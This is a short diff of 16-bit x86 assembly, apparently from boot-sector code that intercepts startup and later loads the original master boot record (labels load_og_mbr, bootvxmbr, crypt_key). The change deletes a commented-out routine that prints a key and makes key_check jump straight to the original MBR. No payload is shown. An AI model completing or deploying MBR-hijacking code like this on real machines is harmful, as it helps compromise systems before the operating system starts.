@@ -181,23 +181,6 @@ welcome:
 	dec cx
 	jnz welcome
 
-;rsvp2:
-;	mov cx, 2
-;	mov si, crypt_key
-;message2:
-;	push cs
-;	pop ds
-;welcome2:
-;	mov al, [si]
-;	mov bh, 0
-;	mov bl, 0x0F
-;	mov ah, 0x0E
-;	int 0x10
-;	inc si
-;	dec cx
-;	jnz welcome2
-;	;jmp key_check
-;;	jmp	load_og_mbr
 ;******************************************************************************
 ;
 ;	Reads char from buffer (function 0h,int16h)
@@ -213,8 +196,9 @@ key_check:
 	cmp	al, 1
 	;jnz	baibai
 	;jmp bootvxmbr:0
-	jnz	load_og_mbr
-	jmp key_check
+	;jnz	load_og_mbr
+	jmp	load_og_mbr
+	;jmp key_check
 ;	jmp	load_og_mbr
 ;******************************************************************************
 ;
